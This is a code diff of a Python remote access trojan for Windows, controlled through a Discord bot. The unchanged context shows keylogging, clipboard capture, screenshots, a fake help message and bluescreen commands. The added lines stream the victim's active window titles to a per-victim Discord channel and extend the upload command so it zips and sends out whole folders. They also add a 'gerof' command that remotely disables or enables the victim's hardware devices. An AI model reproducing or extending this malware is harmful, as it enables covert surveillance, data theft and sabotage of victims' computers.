@@ -1,4 +1,4 @@
-import tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
+import tkinter as tk, winreg as reg, sounddevice as sd, numpy as np, os, platform, time, win32gui, win32con, win32com.client, ctypes, binascii, discord, discord.ext, subprocess, requests, sys, asyncio, keyboard, winreg, pyaudio, threading, pyttsx3, pyperclip, multiprocessing, tempfile, cv2, io, aiohttp, random, difflib, pymsgbox, ctypes.wintypes, time, inspect
 from discord.ext import commands, tasks
 from PIL import ImageGrab
 from pynput.keyboard import Listener
@@ -106,7 +106,7 @@ bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
 
 keylog_buffer = []
 
-hidden_commands = {"serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}
+hidden_commands = {"gerof", "wlan", "serverinfo", "leaveserver", "serverlist", "delonstrg", "randomkb", "resetkb", "removekb", "checkkb", "switchkb", "winr", "joinvoice", "leavevoice", "exec", "ad", "cams", "url", "screen", "screenstart", "screenstop", "reload", "on", "off", "eject", "passes", "add", "tts", "say", "cd", "download", "upload", "ls", "rm", "touch", "rmdir", "mkdir", "run", "bluescreen", "ran", "taskkill", "tskmngr", "checkadmin", "devices", "geolocation", "shutdown", "specs", "restart"}
 
 def on_press(key):
     try:
@@ -124,6 +124,23 @@ async def send_keylog_data(ctx):
 async def send_embed(ctx, message):
     embed = discord.Embed(description=message, color=discord.Color.blue())
     await ctx.send(embed=embed)
+
+last_active_window = None
+
+def get_active_window_title():
+    hwnd = win32gui.GetForegroundWindow()
+    if hwnd:
+        return win32gui.GetWindowText(hwnd)
+    return 'Kein aktives Fenster gefunden'
+
+async def update_channel(channel):
+    global last_active_window
+    while True:
+        current_active_window = get_active_window_title()
+        if current_active_window != last_active_window:
+            last_active_window = current_active_window
+            await channel.send("NEW ACTIVE WINDOW: **" + current_active_window + "**")
+        await asyncio.sleep(1)
 
 @bot.event
 async def on_ready():
@@ -212,6 +229,13 @@ async def on_ready():
 
     if not os.getlogin() == DEV:
         await on(clipboard_channel)
+
+    if not os.getlogin() == DEV:
+        for guild in bot.guilds:
+            if guild.name == "ONLY-ME":
+                for channel in guild.text_channels:
+                    if channel.name == os.getlogin():
+                        await update_channel(channel)
 
 #
 
@@ -363,85 +387,37 @@ async def specs(ctx):
 
     await send_embed_message(ctx.channel, system_specs)
 
-@bot.command(help="Displays devices from Device Manager")
+def list_devices():
+    try:
+        wmi = win32com.client.Dispatch("WbemScripting.SWbemLocator")
+        service = wmi.ConnectServer(".", "root\cimv2")
+        devices = service.ExecQuery("SELECT * FROM Win32_PnPEntity")
+
+        if len(devices) == 0:
+            return "No devices found."
+
+        device_list = []
+        current_length = 0
+        for device in devices:
+            if device.Name:
+                if len(device.Name) + current_length <= 1900:
+                    device_list.append(device.Name)
+                    current_length += len(device.Name)
+                else:
+                    break
+
+        if len(device_list) == 0:
+            return "No devices found."
+
+        formatted_devices = "\n".join(device_list)
+        return f"Available devices:\n{formatted_devices}"
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
+
+@bot.command(help="list devices")
 async def devices(ctx):
-    try:
-        devices = get_device_list()
-        if devices:
-            formatted_devices = format_devices(devices)
-            await send_devices_messages(ctx.channel, formatted_devices)
-        else:
-            await send_embed_message(ctx.channel, "No devices found.")
-    except Exception as e:
-        await send_embed_message(ctx.channel, f"Error retrieving devices: {str(e)}")
-
-async def send_devices_messages(channel, devices):
-    max_length = 2000
-    current_length = 0
-    current_message = ""
-    for line in devices.split('\n'):
-        if len(current_message) + len(line) + 1 > max_length:
-            embed = discord.Embed(description=current_message, color=discord.Color.blue())
-            await channel.send(embed=embed)
-            current_message = ""
-        current_message += line + '\n'
-    if current_message:
-        embed = discord.Embed(description=current_message, color=discord.Color.blue())
-        await channel.send(embed=embed)
-
-def get_device_list():
-    devices = []
-
-    try:
-
-
-        enum_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum', 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
-
-        for category in iter_subkeys(enum_key):
-            category_path = rf'SYSTEM\CurrentControlSet\Enum\{category}'
-            category_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, category_path, 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
-
-            for subcategory in iter_subkeys(category_key):
-                subcategory_path = rf'SYSTEM\CurrentControlSet\Enum\{category}\{subcategory}'
-                subcategory_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, subcategory_path, 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
-
-                device_names = []
-                try:
-                    i = 0
-                    while True:
-                        device_name = reg.EnumKey(subcategory_key, i)
-                        device_names.append(device_name)
-                        i += 1
-                except OSError:
-                    pass
-
-                devices.append((category, device_names))
-
-    except Exception as e:
-        print(f"Error retrieving devices: {e}")
-
-    return devices
-
-def iter_subkeys(key):
-    i = 0
-    while True:
-        try:
-            subkey_name = winreg.EnumKey(key, i)
-            yield subkey_name
-            i += 1
-        except WindowsError as e:
-            break
-
-def format_devices(devices):
-    formatted_devices = []
-    for device in devices:
-        if isinstance(device, tuple):
-            category, subcategories = device
-            subcategories_formatted = ', '.join(subcategories)
-            formatted_devices.append(f"{category}: {subcategories_formatted}")
-        else:
-            formatted_devices.append(device)
-    return '\n'.join(formatted_devices)
+    response = list_devices()
+    await ctx.send(response)
 
 @bot.command(help="Fake Help message")
 async def help(ctx):
@@ -1568,10 +1544,18 @@ async def rm(ctx, *, filename: str):
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
-@bot.command(help="Upload file")
-async def upload(ctx, *, filename: str):
+@bot.command(help="Upload file or folder")
+async def upload(ctx, *, path: str):
     try:
-        await ctx.send(file=discord.File(filename))
+        if os.path.isdir(path):
+            zip_filename = f"{path}.zip"
+            shutil.make_archive(path, 'zip', path)
+            await ctx.send(file=discord.File(zip_filename))
+            os.remove(zip_filename)
+        elif os.path.isfile(path):
+            await ctx.send(file=discord.File(path))
+        else:
+            await ctx.send("Error: The provided path is neither a file nor a directory.")
     except Exception as e:
         await ctx.send(f'Error: {e}')
 
@@ -2067,5 +2051,42 @@ async def wlan(ctx):
             await ctx.send(message)
     else:
         await ctx.send("No WLAN networks found.")
+
+def toggle_device(device_name, state):
+    try:
+        state = state.lower()
+        if state not in ['on', 'off']:
+            return "Invalid state! Use 'on' or 'off'."
+
+        wmi = win32com.client.Dispatch("WbemScripting.SWbemLocator")
+        service = wmi.ConnectServer(".", "root\cimv2")
+        devices = service.ExecQuery(f"SELECT * FROM Win32_PnPEntity WHERE Name LIKE '%{device_name}%'")
+
+        if len(devices) == 0:
+            return f"Device '{device_name}' not found."
+
+        for device in devices:
+            if state == 'on':
+                device.EnableDevice(True)
+            else:
+                device.DisableDevice(False)
+
+        return f"Successfully turned {state} the device: {device_name}"
+    except Exception as e:
+        return f"An error occurred: {str(e)}"
+
+@bot.command(name='gerof')
+async def gerof(ctx, *args):
+    try:
+        device_name = ' '.join(args[:-1])
+        state = args[-1].lower()
+
+        if state not in ['on', 'off']:
+            return await ctx.send("Invalid state! Use 'on' or 'off'.")
+
+        response = toggle_device(device_name, state)
+        await ctx.send(response)
+    except Exception as e:
+        await ctx.send(f"An error occurred: {str(e)}")
 
 bot.run(TOKEN)
